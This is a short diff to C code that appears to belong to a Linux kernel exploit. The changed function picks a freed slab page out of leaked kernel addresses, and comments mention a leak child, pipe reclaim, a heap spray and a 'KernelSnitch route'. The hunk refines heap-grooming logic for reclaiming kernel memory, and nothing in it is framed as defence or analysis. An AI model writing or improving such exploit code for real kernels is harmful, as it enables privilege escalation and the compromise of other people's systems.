@@ -320,8 +320,22 @@ static int tracefs_mm_finish(uintptr_t *leaked, size_t pick, size_t min_index,
   uintptr_t held_page = pick < list_count
                             ? list[pick] & ~(TRACEFS_MM_SLAB_SIZE - 1)
                             : 0;
-  /* The leak child keeps its own page until the very end, so the pipe reclaim
-     only wins on a page that was fully freed during the leak stage. */
+  /*
+   * The leak child is the pick-th record and its page is released last by the
+   * reclaim shaping (close(memfd_leak) right before the spray), which is the
+   * page the KernelSnitch route has always used. Prefer it whenever its object
+   * sits inside the accepted index window.
+   */
+  if (pick < list_count) {
+    size_t index =
+        (size_t)((list[pick] - held_page) / SLIDE_TRACEFS_MM_OBJECT);
+    if (index >= min_index && index <= max_index) {
+      best = list[pick];
+      best_objects = per_slab;
+      best_index = index;
+    }
+  }
+  /* Fall back to any fully owned page that is not the still-held one. */
   for (size_t i = 0; i < list_count && !best; i++) {
     uintptr_t base = list[i] & ~(TRACEFS_MM_SLAB_SIZE - 1);
     if (base == held_page) {
